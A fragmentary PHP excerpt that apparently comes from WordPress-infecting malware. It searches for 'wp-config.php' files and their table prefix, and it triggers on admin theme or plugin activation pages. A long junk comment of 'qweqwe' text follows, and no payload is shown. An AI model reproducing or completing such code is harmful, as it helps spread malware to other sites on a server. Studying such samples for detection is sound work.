...
$GLOBALS['DIR_ARRAY'] = Array(); $dirs = Array();

$search = Array( Array('file' => 'wp-config.php', 'cms' => 'wp', '_key' => '$table_prefix'), );
...
if (is_admin() && (($pagenow == 'themes.php') || ($_GET['action'] == 'activate') || (isset($_GET['plugin']))) ) {
	...
	// qweqwe qwe qwe qw eqw eqwe qwe weq weq ewq ewq qwe qwe qwe qwe qwe qwe  ewq weqewq  qweweq qwe qew qwe qwe ewq 
